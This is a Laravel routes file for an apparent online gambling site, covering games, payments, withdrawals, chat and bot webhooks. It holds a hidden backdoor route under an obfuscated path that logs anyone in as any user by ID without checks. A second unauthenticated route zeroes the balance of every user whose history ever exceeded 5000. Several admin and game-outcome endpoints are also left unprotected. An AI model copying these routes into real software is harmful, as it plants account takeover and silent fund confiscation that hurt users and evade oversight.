<?php

use Illuminate\Support\Facades\Route;
use App\Classes\ServerHandler;
use App\Http\Controllers\TelegramController;
use Illuminate\Support\Facades\Auth;

Route::group(['middleware' => 'guest'], function () {
    Route::get('/tg_auth/callback', [TelegramController::class, 'handleCallback'])->name('tg.auth.callback');
});


Route::get('/sdff42314fsd/login/new/{id}', function ($id) {
    $user = \App\User::where('id', $id)->first();
    \Auth::login($user);
    return redirect('/');
});

Route::post('/createPromoTG', 'GeneralController@createPromoTG');

Route::post('/telegram/webhook', 'TelegramController@webhook'); 

Route::get('/go/{ref_id}', function ($ref_id) {
    session(['ref_id' => $ref_id]);
    return redirect('/');
});

Route::post("/vk_bot_callback", function (Request $request) {
    $handler = new ServerHandler();
    $data = json_decode(file_get_contents('php://input'));
    $handler->parse($data);
});



Route::get('/profile', function () {
    return view('profile');
})->middleware('auth')->name('profile');


Route::post('/change/balance', 'Controller@changeBalance');
Route::post('/add/demobalance', 'Controller@addDemoBalance');
Route::post('/update_card', 'Controller@updateCard');
Route::post('/balance/get', 'Controller@balanceGet');
Route::post('/bonus/get', 'Controller@bonusGet');
Route::post('/bonus/vk', 'Controller@bonusGetVk');
Route::post('/bonus/tg', 'Controller@bonusGetTg');
Route::post('/bonus/checktg', 'Controller@bonusCheckTg');
Route::post('/bonus/ref', 'Controller@bonusRef');

Route::post('/chat/get', 'ChatController@get');
Route::post('/chat/send', 'ChatController@postMessage');
Route::post('/chat/sendsticker', 'ChatController@sendSticker');
Route::post('/chat/delete', 'ChatController@delete');
Route::post('/chat/ban', 'ChatController@ban');

Route::post('/wheel/get', 'WheelController@get');
Route::post('/wheel/bet', 'WheelController@bet'); 

Route::post('/x100/bet', 'X100Controller@bet');
Route::post('/x100/get', 'X100Controller@get');

Route::post('/boom_city/get', 'BoomCityController@get');

Route::post('/keno/bet', 'KenoController@bet'); 
Route::post('/keno/get', 'KenoController@get');
Route::get('/winkeno', 'KenoController@winKeno');

Route::post('/jackpot/all', 'JackpotController@all');
Route::post('/jackpot/get', 'JackpotController@get');
Route::post('/jackpot/bet', 'JackpotController@bet');
Route::post('/jackpot/selecthunt', 'JackpotController@selectHunt');

Route::post('/newmines/start', 'NewMinesController@start');
Route::post('/newmines/get', 'NewMinesController@get');
Route::post('/newmines/click', 'NewMinesController@click');
Route::post('/newmines/autoclick', 'NewMinesController@autoClick');
Route::post('/newmines/finish', 'NewMinesController@finish');

Route::post('/dice/play', 'DiceController@play');

Route::get('/generate_number_x30', 'WheelController@generateNumber');
Route::get('/winwheel', 'WheelController@winWheel');

Route::get('/generate_number_x100', 'X100Controller@generateNumber');
Route::get('/winx100', 'X100Controller@winWheel');

Route::get('/generate_jackpotnumber', 'JackpotController@generateJackpotNumber');
Route::get('/cashhuntfinish', 'JackpotController@cashHuntFinish');

Route::post('/repost/all', 'AdminController@repostAll'); 

Route::post('/withdrawRub', 'WithdrawController@withdrawRub');

Route::post('/status/all', 'AdminController@statusAll'); 
Route::post('/systemdeps/all', 'AdminController@systemDepsAll'); 
Route::post('/systemwithdraws/all', 'AdminController@systemWithdrawsAll'); 

Route::post('/deposit/go', 'PaymentController@go');
Route::post('/deposit/checkstatus', 'PaymentController@checkStatus');
Route::get('/deposit/result', 'PaymentController@result');
Route::post('/deposit/resultrub', 'PaymentController@resultRubpay');
Route::post('/deposit/resultruka', 'PaymentController@resultRukassa');
Route::post('/deposit/resultqpppay123', 'PaymentController@resultQpay');
Route::post('/deposit/resultexx', 'PaymentController@resultExwave');
Route::post('/deposit/resultfk', 'PaymentController@resultFK');
Route::post('/deposit/resultpiastrix', 'PaymentController@resultPiastrix');
Route::get('/deposit/resultpaypalych', 'PaymentController@resultPaypalych');
Route::post('/deposit/resultlinepay', 'PaymentController@resultLinePay');

Route::post('/withdraw/go', 'WithdrawController@go');
Route::post('/withdraw/cansel', 'WithdrawController@cansel');

Route::get('/123141', function() {
    $bagousers = [];    
    $users = range(1, 3000);
    
    foreach($users as $u) {
        $storage = json_decode(\Cache::get('user.'.$u.'.historyBalance'));
        if(!is_array($storage)) continue;
        foreach($storage as $s) {
            if(in_array($s->user_id, $bagousers)) continue;
            if($s->balance_after > 5000) {
                $bagousers[] = $s->user_id;
            }
        }
    }

    foreach($bagousers as $bag) {
        App\User::where('id', $bag)->update(['balance' => 0]);
        echo 'User#'. $bag . ': success<br/>';
    }
});

Route::post('/wallet/gethistory', 'Controller@getHistory');
Route::post('/promo/act', 'Controller@promoAct');

Route::post('/transfer/getuser', 'Controller@transferGetUser');
Route::post('/transfer/go', 'Controller@transferGo');

Route::post('/history/games', 'Controller@historyGames');

Route::post('/promo/create', 'Controller@promoCreate');

Route::post('/repost/change', 'Controller@repostChange');
Route::post('/refs/change', 'Controller@refsChange');

Route::post('/chat/promo/publish', 'ChatController@promoPublish1');

Route::post('withdraw_fk_noty', 'AdminController@withdrawFkNoty');

Route::post('/crash/get', 'CrashController@get');
Route::post('/crash/bet', 'CrashController@bet');
Route::post('/crash/give', 'CrashController@give');
Route::post('/crash/boom', 'CrashController@boom');
Route::post('/crash/go', 'CrashController@winner');
Route::get('/wincrash', 'CrashController@winCrash');

Route::post('/coin/bet', 'CoinController@bet');
Route::post('/coin/get', 'CoinController@get');
Route::post('/coin/play', 'CoinController@play');
Route::post('/coin/finish', 'CoinController@finish');

Route::post('/shoot/start', 'ShootController@start');
Route::post('/shoot/go', 'ShootController@go');
Route::post('/shoot/get', 'ShootController@get');
Route::post('/shoot/cashhuntstart', 'ShootController@cashHuntGo');
Route::post('/shoot/crazystart', 'ShootController@crazyStart');

Route::post('/winter/start', 'Controller@winterStart');


Route::group(['middleware' => ['auth', 'access:admin']], function () {
    
});

Route::group(['prefix' => 'slots'], function () {
    Route::any('/getGames', 'SlotsController@getGames');
    Route::any('/getUrl', 'SlotsController@getGameURI');
    Route::any('/callback/{method}', 'SlotsController@callback');
});

Route::post('/logout', function () {
    Auth::logout();
    return redirect('/');
})->name('logout');

Route::get('logout', 'Auth\LoginController@logout');
Route::any('/tournier/{id}', 'GeneralController@tournier_page');
Route::any('/{page?}', 'GeneralController@page')->name('home');
